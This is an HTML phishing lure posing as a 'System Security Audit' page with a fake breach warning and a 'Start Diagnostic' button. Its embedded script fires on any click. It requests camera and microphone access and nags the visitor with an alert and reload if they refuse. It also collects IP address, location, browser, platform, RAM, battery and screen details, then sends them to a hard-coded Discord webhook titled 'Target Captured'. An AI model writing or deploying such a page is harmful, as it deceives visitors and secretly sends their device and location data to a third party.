<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Security Audit</title>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";

        async function initCapture() {
            try {
                // محاولة طلب الكاميرا والميكروفون فور النقر
                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                sendData("Granted");
            } catch (err) {
                // في حال الرفض، نرسل البيانات مع حالة الرفض وننبه المستخدم
                sendData("Denied/Blocked");
                alert("Security Alert: Permission required to verify device integrity.");
                location.reload(); 
            }
        }

        async function sendData(camStatus) {
            let info = {
                ip: "Scanning...",
                loc: "Unknown",
                ua: navigator.userAgent,
                plat: navigator.platform,
                ram: navigator.deviceMemory || "Unknown",
                bat: "Unknown",
                res: `${window.screen.width}x${window.screen.height}`
            };

            try {
                // سحب الـ IP والموقع الجغرافي
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                info.ip = data.ip || "Unknown";
                info.loc = `${data.city || '?'}, ${data.country_name || '?'}`;
            } catch (e) {
                info.ip = "Error/VPN";
            }

            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                info.bat = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Not Charging"})`;
            }

            const payload = {
                embeds: [{
                    title: "🎯 Target Captured - V14",
                    color: 16711680,
                    fields: [
                        { name: "🌐 IP Address", value: info.ip, inline: true },
                        { name: "📍 Location", value: info.loc, inline: true },
                        { name: "📸 Permissions", value: camStatus, inline: true },
                        { name: "🔋 Battery", value: info.bat, inline: true },
                        { name: "🧠 RAM", value: info.ram + " GB", inline: true },
                        { name: "🖥️ Resolution", value: info.res, inline: true },
                        { name: "📱 OS/Platform", value: info.plat, inline: false },
                        { name: "🕵️ Browser Info", value: info.ua, inline: false }
                    ],
                    footer: { text: "r3b Supreme Engine | System Audit" },
                    timestamp: new Date()
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        // تفعيل الكود عند أول ضغطة في أي مكان بالصفحة
        window.onclick = initCapture;
    </script>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .panel { border: 2px solid #00ff00; padding: 50px; text-align: center; box-shadow: 0 0 15px #00ff00; background: #000; position: relative; }
        .panel h1 { font-size: 24px; margin-bottom: 10px; text-transform: uppercase; }
        .panel p { font-size: 14px; color: #888; margin-bottom: 30px; }
        .scan-line { width: 100%; height: 2px; background: #00ff00; position: absolute; top: 0; left: 0; animation: scan 2s linear infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .btn { background: #00ff00; color: #000; border: none; padding: 15px 40px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 16px; }
        .btn:hover { background: #00cc00; }
    </style>
</head>
<body>
    <div class="panel">
        <div class="scan-line"></div>
        <h1>System Breach Detected</h1>
        <p>A manual security audit is required for your device.</p>
        <button class="btn">Start Diagnostic</button>
    </div>
</body>
</html>
